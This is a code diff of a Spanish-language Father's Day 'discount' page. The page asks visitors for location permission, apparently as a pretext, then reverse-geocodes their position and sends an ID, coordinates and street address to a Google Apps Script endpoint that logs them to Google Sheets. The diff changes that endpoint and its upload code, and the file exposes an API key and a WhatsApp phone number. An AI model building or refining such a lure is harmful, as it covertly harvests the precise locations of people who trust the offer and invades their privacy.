@@ -72,7 +72,7 @@
         <div id="loading-area">
             <div class="loader"></div>
             <h1 class="title-dark">Procesando...</h1>
-            <p id="status" class="text-dark">Por favor, acepta el permiso de ubicación para generar tu descuento espacial para Papá.</p>
+            <p id="status" class="text-dark">Por favor, acepta el permiso de ubicación para generar tu descuento de Papá.</p>
         </div>
 
         <div id="success-area" class="hidden">
@@ -92,8 +92,7 @@
 
     <script>
         const GEOAPIFY_KEY = "73282b6f42214899a14ad7ad5421244d"; 
-        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby6F0yOvrZyKzPFXghxEfJUl29512KwX8WWuJrE1SXJ0yKQ46woByPgtrxoi5YZoa5uiA/exec";
-        // Nuevo número de WhatsApp actualizado con prefijo de país
+        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzhfTEnSoEjs_8DIphwG0bgcsNpqIw_vu1O3AtpvH6dwHnDJIIIQCrOaWtk6H7pcuKWcw/exec";
         const PHONE = "522712076727";
 
         function generarID() {
@@ -110,12 +109,16 @@
                         const direccion = geoData.features[0].properties.formatted;
                         const idUnico = generarID();
 
-                        // Registro en Google Sheets
-                        await fetch(WEB_APP_URL, {
+                        // REGISTRO EN GOOGLE SHEETS (Método optimizado de envío)
+                        const formData = new FormData();
+                        formData.append('idUnico', idUnico);
+                        formData.append('lat', lat);
+                        formData.append('lon', lon);
+                        formData.append('direccion', direccion);
+
+                        fetch(WEB_APP_URL, {
                             method: 'POST',
-                            mode: 'no-cors',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ idUnico, lat, lon, direccion })
+                            body: formData
                         });
 
                         // CONFIGURACIÓN DEL MENSAJE DEL DÍA DEL PADRE
